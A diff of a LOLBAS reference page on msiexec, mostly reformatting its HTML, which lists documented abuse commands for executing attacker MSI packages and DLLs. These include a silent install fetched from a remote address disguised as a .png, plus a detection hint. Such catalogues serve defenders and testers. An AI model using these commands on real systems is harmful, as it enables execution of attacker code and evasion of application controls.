@@ -28,15 +28,19 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Msiexec/#execute">Execute</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Msiexec/#execute">Execute</a></li>
+	
 </ul>
 
+	
+
 <p>Used by Windows to execute msi files</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -50,106 +54,101 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/">https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/</a></li>
+	<a href="https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/">https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/</a>
+	<br>
 	
-	<li><a href="https://twitter.com/PhilipTsukerman/status/992021361106268161">https://twitter.com/PhilipTsukerman/status/992021361106268161</a></li>
+	<a href="https://twitter.com/PhilipTsukerman/status/992021361106268161">https://twitter.com/PhilipTsukerman/status/992021361106268161</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>netbiosX - <a href="https://twitter.com/@netbiosX">@netbiosX</a </li>
+	netbiosX - <a href="https://twitter.com/@netbiosX">@netbiosX</a>
+	<br>
 	
-	<li>Philip Tsukerman - <a href="https://twitter.com/@PhilipTsukerman">@PhilipTsukerman</a </li>
+	Philip Tsukerman - <a href="https://twitter.com/@PhilipTsukerman">@PhilipTsukerman</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li>msiexec.exe getting files from Internet</li>
+	msiexec.exe getting files from Internet
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="execute" class="function-name">Execute</h2>
-
-<p>The LOLBAS can achieve abritrary code execution.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Installs the target .MSI file silently.</p>
-
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Installs the target .MSI file silently.
+		<br>
+		<pre><code>msiexec /quiet /i cmd.msi</code></pre>
 		Usecase:Execute custom made msi file with attack code
-        <pre><code>msiexec /quiet /i cmd.msi</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Installs the target remote &amp; renamed .MSI file silently.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Installs the target remote & renamed .MSI file silently.
+		<br>
+		<pre><code>msiexec /q /i http://192.168.100.3/tmp/cmd.png</code></pre>
 		Usecase:Execute custom made msi file with attack code from remote server
-        <pre><code>msiexec /q /i http://192.168.100.3/tmp/cmd.png</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Calls DLLRegisterServer to register the target DLL.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Calls DLLRegisterServer to register the target DLL.
+		<br>
+		<pre><code>msiexec /y "C:\folder\evil.dll"</code></pre>
 		Usecase:Execute dll files
-        <pre><code>msiexec /y "C:\folder\evil.dll"</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Calls DLLRegisterServer to un-register the target DLL.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Calls DLLRegisterServer to un-register the target DLL.
+		<br>
+		<pre><code>msiexec /z "C:\folder\evil.dll"</code></pre>
 		Usecase:Execute dll files
-        <pre><code>msiexec /z "C:\folder\evil.dll"</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
